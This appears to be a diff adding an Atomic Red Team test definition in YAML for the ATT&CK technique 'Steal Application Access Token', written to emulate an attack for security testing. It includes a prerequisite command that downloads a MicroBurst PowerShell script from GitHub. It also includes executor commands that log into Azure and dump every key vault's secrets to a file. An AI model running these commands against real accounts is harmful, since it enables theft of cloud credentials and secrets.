@@ -1,0 +1,59 @@
+attack_technique: T1528
+display_name: Steal Application Access Token
+atomic_tests:
+- name: Azure - Dump All Azure Key Vaults with Microburst
+  auto_generated_guid: 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea
+  description: |-
+   Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
+   See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/
+  supported_platforms:
+  - iaas:azure
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: String
+      default: null
+    password:
+      description: Azure AD password
+      type: String
+      default: T1082Az
+    output_file:
+      description: File to dump results to
+      type: String
+      default: $env:temp\T1528Test1.txt
+    subscription_id:
+      description: Azure subscription id to search
+      type: String
+      default: null
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The Get-AzurePasswords script must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\Get-AzurePasswords.ps1){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "$env:temp\Get-AzurePasswords.ps1"
+  - description: |
+      The Azure RM module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureRM -Force -allowclobber
+  - description: |
+      The Azure module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name Azure -Force -allowclobber
+  executor:
+    command: |
+      import-module "$env:temp\Get-AzurePasswords.ps1"
+      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
+      Connect-AzureRmAccount -Credential $Credential
+      Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
+      cat #{output_file}
+    cleanup_command: |
+      remove-item #{output_file} -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: true
